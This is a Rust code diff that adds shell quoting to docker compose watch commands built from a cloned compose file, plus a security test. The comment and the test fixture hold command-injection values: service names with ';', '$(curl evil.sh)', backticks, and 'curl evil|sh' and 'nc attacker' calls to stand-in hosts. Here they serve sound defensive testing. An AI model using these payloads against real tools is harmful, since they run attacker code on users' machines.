@@ -114,14 +114,21 @@ pub fn plan_from(file: &Path) -> Option<Plan> {
 /// Every one of them only WATCHES. The deploy itself is staged at a prompt for the
 /// user to fire: a window that arranges itself is a convenience, one that deploys by
 /// itself is an accident waiting for a witness.
+///
+/// The directory and the service names are QUOTED. Both come out of a file the user
+/// cloned rather than wrote, these lines are handed to `sh -c`, and a room opens
+/// without anybody confirming anything: a service key spelled `x;curl evil|sh` would
+/// otherwise be a repository that runs code by being opened. Quoting is also what
+/// keeps a project path with a space in it from breaking every pane.
 pub fn watch_commands(plan: &Plan, max_services: usize) -> Vec<(String, String)> {
-    let dir = plan.file.parent().unwrap_or(Path::new(".")).to_string_lossy().into_owned();
+    let dir = crate::shell_quote(&plan.file.parent().unwrap_or(Path::new(".")).to_string_lossy());
     let mut out = vec![(
         "status".to_string(),
         format!("cd {dir} && watch -n 2 docker compose ps"),
     )];
     for svc in plan.services.iter().take(max_services) {
-        out.push((svc.clone(), format!("cd {dir} && docker compose logs -f --tail 40 {svc}")));
+        let quoted = crate::shell_quote(svc);
+        out.push((svc.clone(), format!("cd {dir} && docker compose logs -f --tail 40 {quoted}")));
     }
     out
 }
@@ -207,6 +214,33 @@ volumes:
             for danger in ["up -d", "down", "restart", "pull", "deploy"] {
                 assert!(!cmd.contains(danger), "{cmd} does more than watch");
             }
+        }
+    }
+
+    /// A compose file is text somebody else wrote, and opening a war room asks the
+    /// user nothing. Nothing read out of it may reach `sh -c` as syntax — a service
+    /// key spelled like a command must stay a word, and a path with a space in it
+    /// must stay one path.
+    #[test]
+    fn nothing_read_from_the_file_reaches_the_shell_as_syntax() {
+        let plan = Plan {
+            file: PathBuf::from("/srv/my project/compose.yaml"),
+            services: vec![
+                "api".into(),
+                "x;touch /tmp/pwned".into(),
+                "$(curl evil.sh)".into(),
+                "a`id`b".into(),
+                "b|nc attacker 1".into(),
+            ],
+        };
+        for (_, cmd) in watch_commands(&plan, 9) {
+            // Everything the shell would act on has to sit INSIDE the quotes; what is
+            // left outside them is only this module's own template.
+            let outside: String = cmd.split('\'').step_by(2).collect();
+            for c in [';', '$', '|', '(', ')', '`', '\n', '>', '<'] {
+                assert!(!outside.contains(c), "{c:?} escaped the quotes in {cmd:?}");
+            }
+            assert!(cmd.contains("'/srv/my project'"), "the path stays one word: {cmd}");
         }
     }
 }
